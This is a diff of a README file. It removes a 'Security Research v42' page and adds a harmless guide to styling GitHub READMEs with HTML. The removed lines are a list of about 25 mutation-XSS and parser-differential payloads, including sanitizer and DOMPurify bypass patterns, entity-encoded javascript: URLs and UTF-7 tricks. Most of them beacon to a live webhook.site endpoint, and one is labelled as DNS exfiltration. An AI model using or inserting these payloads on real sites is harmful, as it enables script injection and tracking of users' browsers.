@@ -1,216 +1,407 @@
-# Security Research - v42
 
-## Mutation XSS (mXSS) & Parser Differentials
 
-Testing advanced mXSS techniques exploiting parser differences.
+
+<h2 align="center">Guide on how to style your readme different from anyone else</h2>
+
+<b>Bold</b>
+
+<i>Italic</i>
+
+<s>Strikethrough</s>
+
+<strong>Strong</strong>
+
+<em>Emphasis</em>
+
+<del>Deleted</del>
+
+<ins>Inserted</ins>
+
+<mark>Highlighted</mark>
+
+<sup>Superscript</sup>
+
+<sub>Subscript</sub>
+
+<code>Code</code>
+
+<pre>Preformatted</pre>
+
+<kbd>Keyboard</kbd>
+
+<samp>Sample output</samp>
+
+<table><tr><td>Boxed text</td></tr></table>
+
+<ul><li>Unordered list</li></ul>
+<ol><li>Ordered list</li></ol>
+<dl><dt>Term</dt><dd>Definition</dd></dl>
+
+
+<details>
+<summary>title of the content</summary>
+
+content body
+
+```json
+{
+  support: "codeblock to"
+}
+```
+</details>
+
+> **Sir Charles Antony Richard Hoare**
+>> *"Long quote text here..."*
+
+
+<table>
+  <tr>
+    <td align="center"><b>example</b></td>
+    <td><img src="zebbernpanda.png" width="50"></td>
+  </tr>
+</table>
+
+
+<ruby>v2.1.0<rt>🚀 Latest Release</rt></ruby>
+<ruby>Beta<rt>⚠️ Testing Phase</rt></ruby>
+<ruby>Stable<rt>✅ Production Ready</rt></ruby>
+
+<ruby>@username<rt>👨‍💻 Lead Developer</rt></ruby>
+<ruby>@designer<rt>🎨 UI/UX Designer</rt></ruby>
+
+<ruby>MIT<rt>📄 Open Source License</rt></ruby>
+<ruby>GPL<rt>🔒 Copyleft License</rt></ruby>
+
+<ruby>API<rt>Application Programming Interface</rt></ruby>
+<ruby>REST<rt>Representational State Transfer</rt></ruby>
+<ruby>JWT<rt>JSON Web Token</rt></ruby>
+<ruby>CRUD<rt>Create Read Update Delete</rt></ruby>
+
+<ruby>漢<rt>かん</rt></ruby>
+
+<hr>
+
+<kbd>
+<h1><code>H1</code></h1>
+</kbd>
+<kbd>
+<h2><code>H2</code></h2>
+</kbd>
+<kbd>
+<h3><code>H3</code></h3>
+</kbd>
+<kbd>
+<h4><code>H4</code></h4>
+</kbd>
+<kbd>
+<h5><code>H5</code></h5>
+</kbd>
+<kbd>
+<h6><code>H6</code></h6>
+</kbd>
+<kbd>
+<code>Default</code>
+</kbd>
+
+</kbd>
+
+
+
+```diff
+- test
++ test
+!test
+@@ test @@
+===================================================================
+***************
+*** 1,3 ****
+--- 1,3 ----
+diff --test
+```
+### We Can Also choose to put them beside eachother
+<kbd>
+<h1><code>H1</code></h1>
+</kbd>
+<kbd>
+<h2><code>H2</code></h2>
+</kbd>
+<kbd>
+<h3><code>H3</code></h3>
+</kbd>
+<kbd>
+<h4><code>H4</code></h4>
+</kbd>
+<kbd>
+<h5><code>H5</code></h5>
+</kbd>
+<kbd>
+<h6><code>H6</code></h6>
+</kbd>
+<kbd>
+<code>Default</code>
+</kbd>
+
+</kbd>
+
+<kbd>
+  
+```diff
+- test
++ test
+!test
+@@ test @@
+===================================================================
+***************
+*** 1,3 ****
+--- 1,3 ----
+diff --test
+```
+</kbd>
+
+### You dont need to wrap it in `kbd` either this is without
+
+
+<h1><code>H1</code></h1>
+
+<h2><code>H2</code></h2>
+
+<h3><code>H3</code></h3>
+
+<h4><code>H4</code></h4>
+
+<h5><code>H5</code></h5>
+
+<h6><code>H6</code></h6>
+
+<code>Default</code>
+  
+```diff
+- test
++ test
+!test
+@@ test @@
+===================================================================
+***************
+*** 1,3 ****
+--- 1,3 ----
+diff --test
+```
+
+### Ever thought about putting pictures next to a text? well you can!
+
+<div align="left">
+
+  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
+
+<kbd>
+
+<h1>Style to left</h1>
+
+<kbd>🔹<strong>Make some text</strong></kbd> 
+
+🔹<strong>Make some text</strong>
+
+🔹Make some text
+
+</div>
+
+
+<div align="center">
+
+<kbd>
+
+<h1>Style to center</h1>
+
+</kbd>
+
+  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
+
+<kbd>
+
+<h1>Style to center</h1>
+
+<kbd>🔹<strong>Make some text</strong></kbd> 
+
+🔹<strong>Make some text</strong>
+
+🔹Make some text
+
+</div>
+
+<div align="center">
+
+<div align="right">
+
+  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
+
+<kbd>
+
+<h1>Style to right</h1>
+
+<kbd>🔹<strong>Make some text</strong></kbd> 
+
+🔹<strong>Make some text</strong>
+
+🔹Make some text
+
+</div>
+
+<kbd>
+
+<h1>Another way you can style</h1>
+
+<kbd>🔹<strong>Make some text</strong></kbd> 
+
+🔹<strong>Make some text</strong>
+
+🔹Make some text
+
+  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
+
+
+</div>
+
+### Clean Start Look
+
+<div align="center">
+   
+   <a href="https://github.com/zebbern/">
+      <img src="zebbernpanda.png" width="13%">
+   </a>
+
+![Python](https://img.shields.io/badge/Python-3.x-blue)
+![Status](https://img.shields.io/badge/Status-Active-green)
+![License](https://img.shields.io/badge/License-MIT-brightgreen)
+
+**Put a short bio or whatever you want here about your project something short but catchy explaining your project**
 
 ---
 
-### 1) SVG Foreign Object mXSS
+<div align="center">
+
+<h3 align="center">Features ⁀➴ </h3>
+
+<kbd>
+<h3>
+ 
+Feature 1 test test test test test test test test test test
 
-<svg><foreignobject><![CDATA[<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-fo.gif">]]></foreignobject></svg>
+</h3>
+</kbd>
+<br>
+<kbd>
+<h3>
+ 
+Feature 2 test test test test test test test test
 
-<svg><foreignobject><body><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-fo-body.gif"></body></foreignobject></svg>
+</h3>
+</kbd>
+<br>
+<kbd>
+<h3>
+ 
+<code>Feature 3 test test test test test test</code>
 
----
+</h3>
+</kbd>
+<br>
+<kbd>
+<h4>
+ 
+Supports status code filtering
 
-### 2) MathML Foreign mXSS
+</h4>
+</kbd>
 
-<math><mtext><table><mglyph><style><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/math-mtext.gif">
+</kbd>
+<br>│
+<br>│
+<br>🢃<br>
+<kbd>
 
-<math><annotation-xml encoding="text/html"><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/math-annotation.gif"></annotation-xml></math>
+<h3 align="left">
+ 
+<kbd>$ </kbd> [HeaderRefer1](#HeaderRefer1) 
 
----
+<kbd>$ </kbd> [HeaderRefer2](#HeaderRefer2) We can also add context
 
-### 3) Noscript Context Escape
+<kbd>$ </kbd> [HeaderRefer3](#HeaderRefer3) <kbd>or wrap it up</kbd>
 
-<noscript><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noscript-img.gif"></noscript>
+</h3>
+</kbd>
 
-<noscript><link rel="stylesheet" href="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noscript-css.css"></noscript>
+<h4 id="HeaderRefer1">HeaderRefer1</h4>
+<h4 id="HeaderRefer2">HeaderRefer2</h4>
+<h4 id="HeaderRefer3">HeaderRefer3</h4>
+  
+<div align="center">
 
-<noscript></noscript><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-noscript.gif">
+<h1 align="center">🢇⁀🐧 ˗˗˗ˏˋ🖳ˎˊ˗˗˗ 🪟⁀🡾</h1>
 
----
+<kbd>
 
-### 4) Title/Textarea Parser Bypass
+<h1 id="linux">Linux/macOS</h1>
 
-<title><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/title.gif"></title>
+### Run these commands:
+<kbd>
+<h3>
 
-<textarea><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/textarea.gif"></textarea>
+```
+git clone https://github.com/zebbern/dezcrwl.git
+cd example
+chmod +x example.sh
+./example.sh
+```
+</h3>
+</kbd>
 
-<title></title><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-title.gif">
+</kbd>
 
----
+<kbd>
+ 
+<h1 id="windows">Windows</h1>
 
-### 5) NoEmbed/NoFrames Context
+### Run these commands:
+<kbd>
+<h3>
 
-<noembed><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noembed.gif"></noembed>
+```
+git clone https://github.com/zebbern/dezcrwl.git
+cd example
+example.sh
 
-<noframes><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noframes.gif"></noframes>
+```
+</h3>
+</kbd>
 
----
+</kbd>
 
-### 6) Raw Text Elements Breakout
+### Now run `example -h` anywhere in terminal
 
-<script><</script><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/script-break.gif">
+</div>
+</div>
+</div>
 
-<style><</style><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/style-break.gif">
+<br>
+<br>
 
----
+### You can also use these to get a users attention:
 
-### 7) Table-Based mXSS
+> [!NOTE]
+> Useful information that users should know, even when skimming content.
 
-<table><tr><caption><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/table-caption.gif"></caption></tr></table>
+> [!TIP]
+> Helpful advice for doing things better or more easily.
 
-<table><colgroup><col><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/table-col.gif"></colgroup></table>
+> [!IMPORTANT]  
+> Key information users need to know to achieve their goal.
 
-<table><tbody><math><mtext><h1><a href="javascript:alert(1)">mXSS</a></h1></mtext></math></tbody></table>
+> [!WARNING]
+> Urgent info that needs immediate user attention to avoid problems.
 
----
+> [!CAUTION]
+> Advises about risks or negative outcomes of certain actions.
 
-### 8) Select/Option mXSS
 
-<select><option><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/select-option.gif"></option></select>
 
-<select><option></option></select><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-select.gif">
 
----
-
-### 9) DOMPurify Bypass Patterns
-
-<form><math><mtext></form><form><mglyph><style></math><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/domclobber1.gif">
-
-<svg><animate href="#x" attributeName="href" values="javascript:alert(1)"></animate><a id="x"><text>Click</text></a></svg>
-
----
-
-### 10) Namespace Confusion
-
-<svg><p><style><g title="</style><img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/ns-confusion.gif'>
-
-<svg><![CDATA[<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-cdata.gif">]]></svg>
-
----
-
-### 11) Comment-Based mXSS
-
-<!--><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment1.gif">-->
-
-<!--<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment2.gif">--!>
-
-<comment><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment-tag.gif"></comment>
-
----
-
-### 12) Entity Decoding After Parse
-
-<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">Entity XSS</a>
-
-<a href="&Tab;javascript&colon;alert(1)">Tab entity</a>
-
-<a href="java&NewLine;script:alert(1)">Newline entity</a>
-
----
-
-### 13) UTF-7 BOM Injection
-
-<a href="+ADw-script+AD4-alert(1)+ADw-/script+AD4-">UTF-7</a>
-
-+ADw-img src=x onerror=alert(1)+AD4-
-
----
-
-### 14) Closing Tag Confusion
-
-<p/onclick="alert(1)">Click P</p>
-
-<img/src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/slash-img.gif"/onerror="alert(1)">
-
-<input/onfocus="alert(1)" autofocus>
-
----
-
-### 15) Nested Template Exploit
-
-<template><template><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/nested-template.gif"></template></template>
-
-<template id="t"><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/template-id.gif"></template>
-
----
-
-### 16) Ruby Tag Bypass
-
-<ruby><rb>test</rb><rp><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/ruby.gif"></rp><rt></rt></ruby>
-
----
-
-### 17) Object/Param mXSS
-
-<object><param name="movie" value="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/param.swf"></object>
-
----
-
-### 18) Keygen Element (Legacy)
-
-<keygen name="test" onfocus="alert(1)" autofocus>
-
----
-
-### 19) Menu/MenuItem (Legacy)
-
-<menu><menuitem onclick="alert(1)">Click</menuitem></menu>
-
----
-
-### 20) Command Element (Legacy)
-
-<command onclick="alert(1)">Command</command>
-
----
-
-### 21) ContentEditable XSS
-
-<div contenteditable="true" onblur="alert(1)">Edit me</div>
-
-<span contenteditable onkeydown="alert(1)">Type here</span>
-
----
-
-### 22) Design Mode
-
-<iframe srcdoc="<img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/srcdoc.gif'>"></iframe>
-
----
-
-### 23) Picture Source mXSS
-
-<picture>
-  <source media="(min-width: 0px)" srcset="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/picture-source.gif">
-  <img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/picture-img.gif">
-</picture>
-
----
-
-### 24) Object Data URI
-
-<object data="data:text/html,<img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/object-data.gif'>"></object>
-
----
-
-### 25) Processing Instruction
-
-<?xml-stylesheet href="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/pi.css"?>
-
----
-
-### DNS Exfil
-
-![DNS](https://v42-dns.d62bdb5c-7bf6-46b6-b997-4cb10a584777.dnshook.site/dns.gif)
-
-### Canary
-
-![Canary](https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/v42-canary.gif)
-
----
-
-*v42 - Mutation XSS & parser differentials*
